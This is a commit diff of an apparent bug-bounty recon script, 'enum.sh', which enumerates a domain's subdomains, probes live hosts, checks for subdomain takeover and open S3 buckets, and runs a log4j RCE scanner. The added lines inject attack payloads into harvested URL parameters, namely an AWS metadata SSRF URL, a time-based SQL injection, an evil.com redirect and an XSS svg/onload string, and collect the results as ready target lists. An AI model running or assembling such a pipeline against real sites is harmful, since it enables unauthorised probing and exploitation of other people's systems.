a650dc688456cb899c76d5bd94abd6f90f14003a
Yogendra Singh <106531785+YOGENDRA-S@users.noreply.github.com>
2022-10-09 12:51:39 +0530

    Update enum.sh

--- enum.sh
+++ enum.sh
@@ -14,36 +14,36 @@ fi
 
 
 
-host $domain | tee -a hostinfo.txt 
-dig $domain any | tee -a diginfo.txt
+host $domain | anew hostinfo.txt 
+dig $domain any | anew diginfo.txt
 subfinder -d $domain -o op.txt
-assetfinder --subs-only $domain | tee -a op.txt
+assetfinder --subs-only $domain | anew op.txt
 
 
-amass enum -passive -d $domain | tee -a op.txt
-amass enum -active -d $domain | tee -a amass_ips.txt
+amass enum -passive -d $domain | anew op.txt
+amass enum -active -d $domain | anew amass_ips.txt
+crobat -s $domain | anew amass_ips.txt
+cat amass_ips.txt | awk '{print $1}' | anew op.txt
 
-cat amass_ips.txt | awk '{print $1}' | tee -a op.txt
-
-cat op.txt | sort -u | tee -a all.txt 
-cat all.txt | httprobe | tee -a alive2.txt
-cat alive2.txt | sort -u | tee -a alive.txt
+cat op.txt | sort -u | anew all.txt 
+cat all.txt | httprobe | anew alive2.txt
+cat alive2.txt | sort -u | anew alive.txt
 
 echo "checing for sub-domain TakeOver"
-subzy -targets all.txt -hide_fails | tee -a SubdomainTakeover.txt
+subzy -targets all.txt -hide_fails | anew SubdomainTakeover.txt
 
 echo "finding parameter and Next scan for xss"
 for i in $(cat all.txt);do ./tools/ParamSpider/paramspider.py -d $i ;done 
-cat output/*.txt | sort -u | tee -a paramspideroutput.txt
+cat output/*.txt | sort -u | anew paramspideroutput.txt
 
 echo "starting Cms Detection"
-whatweb -i alive.txt | tee -a whatweb_op.txt 
+whatweb -i alive.txt | anew whatweb_op.txt 
 
 echo "AWS s3 checking" 
-for i in $(cat op.txt);do aws s3 ls s3://$1 --no-sign-request --region us-west-2 ;done| tee Awsmischeck.txt
+for i in $(cat op.txt);do aws s3 ls s3://$1 --no-sign-request --region us-west-2 ;done| anew Awsmischeck.txt
 
 cd /root/tools/dirsearch
-./dirsearch.py -u $domain | tee -a ../../dirseaechfuzz.txt
+./dirsearch.py -u $domain | anew ../../dirseaechfuzz.txt
 
 cd
 
@@ -51,36 +51,47 @@ echo "GF patterns scan"
 mkdir gfpatternsscan
 
 cat alive.txt | waybackurls | sort -u >> waybackdata
-cat waybackdata | gf redirect | tee -a gfpatternsscan/redirectGF.txt 
-cat waybackdata | gf xss | tee -a gfpatternsscan/xssGF.txt
-cat waybackdata | gf ssti | tee -a gfpatternsscan/sstiGF.txt
-cat waybackdata | gf sqli | tee -a gfpatternsscan/sqliGF.txt
-cat waybackdata | gf rce |  tee -a gfpatternsscan/rceGF.txt
-cat waybackdata | gf lif | tee -a gfpatternsscan/lfiGF.txt
-cat waybackdata | gf ssrf | tee -a gfpatternsscan/ssrfparamsGF.txt 
+cat waybackdata | gf redirect | anew gfpatternsscan/redirectGF.txt 
+cat waybackdata | gf xss | anew gfpatternsscan/xssGF.txt
+cat waybackdata | gf ssti | anew gfpatternsscan/sstiGF.txt
+cat waybackdata | gf sqli | anew gfpatternsscan/sqliGF.txt
+cat waybackdata | gf rce |  anew gfpatternsscan/rceGF.txt
+cat waybackdata | gf lif | anew gfpatternsscan/lfiGF.txt
+cat waybackdata | gf ssrf | anew gfpatternsscan/ssrfparamsGF.txt 
 
 
+   
+cat gfpatternsscan/xssGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q xss.txt
+cat gfpatternsscan/lfiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q lfi.list
+cat gfpatternsscan/rceGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q Vrce.list
+cat gfpatternsscan/ssrfparamsGF.txt | sed "s/'\|(\|)//g" | bhedak "http://169.254.169.254/latest/meta-data/hostname" | anew -q Vssrf.list
+cat gfpatternsscan/sstiGF.txt | sed "s/'\|(\|)//g" | bhedak "FUZZ" | anew -q Vssti.list
+cat gfpatternsscan/sqliGF.txt | sed "s/'\|(\|)//g" | bhedak "(select(0)from(select(sleep(5)))v)" | anew -q Vsqli.list
+cat gfpatternsscan/redirectGF.txt | sed "s/'\|(\|)//g" | bhedak "http://www.evil.com/" | anew -q Vredirect.list
+
+ xargs -a gfpatternsscan/xssGF.txt -P 30 -I % bash -c "echo % | kxss" | grep "< >\|\"" | anew -q xss.list
+ cat xss.list | bhedak "\">/><svg/onload=confirm(document.domain)>" | anew -q Vxss.txt
 
 
 echo "log4jscan but you need to enter burp server" 
 
-root/tools/log4j-RCE-Scanner/./log4j-rce-scanner.sh -l alive -b $burp | tee -a log4jscan.txt
+root/tools/log4j-RCE-Scanner/./log4j-rce-scanner.sh -l alive -b $burp | anew log4jscan.txt
 
 
 mkdir wayback_data 
 cd wayback_data 
-for i in $(cat ../all.txt);do echo $i | waybackurls ;done | tee -a wb.txt
-cat wb.txt | sort -u | grep "=" | tee -a paramlist.txt
+for i in $(cat ../all.txt);do echo $i | waybackurls ;done | anew wb.txt
+cat wb.txt | sort -u | grep "=" | anew paramlist.txt
 
-cat wb.txt | grep -p "\w+\.js(\?|$)" | sort -u | tee -a jsurls.txt
+cat wb.txt | grep -p "\w+\.js(\?|$)" | sort -u | anew jsurls.txt
 
-cat wb.txt | grep -p "\w+\.php(\?|$)" | sort -u | tee -a phpurls.txt
+cat wb.txt | grep -p "\w+\.php(\?|$)" | sort -u | anew phpurls.txt
 
-cat wb.txt | grep -p "\w+\.aspx(\?|$)" | sort -u | tee -a aspxurls.txt
+cat wb.txt | grep -p "\w+\.aspx(\?|$)" | sort -u | anew aspxurls.txt
 
-cat wb.txt | grep -p "\w+\.jsp(\?|$)" | sort -u | tee -a jspurls.txt
+cat wb.txt | grep -p "\w+\.jsp(\?|$)" | sort -u | anew jspurls.txt
 
-cat wb.txt | grep -p "\w+\.txt(\?|$)" | sort -u | tee -a robots.txt
+cat wb.txt | grep -p "\w+\.txt(\?|$)" | sort -u | anew robots.txt
 
 cd ..
 
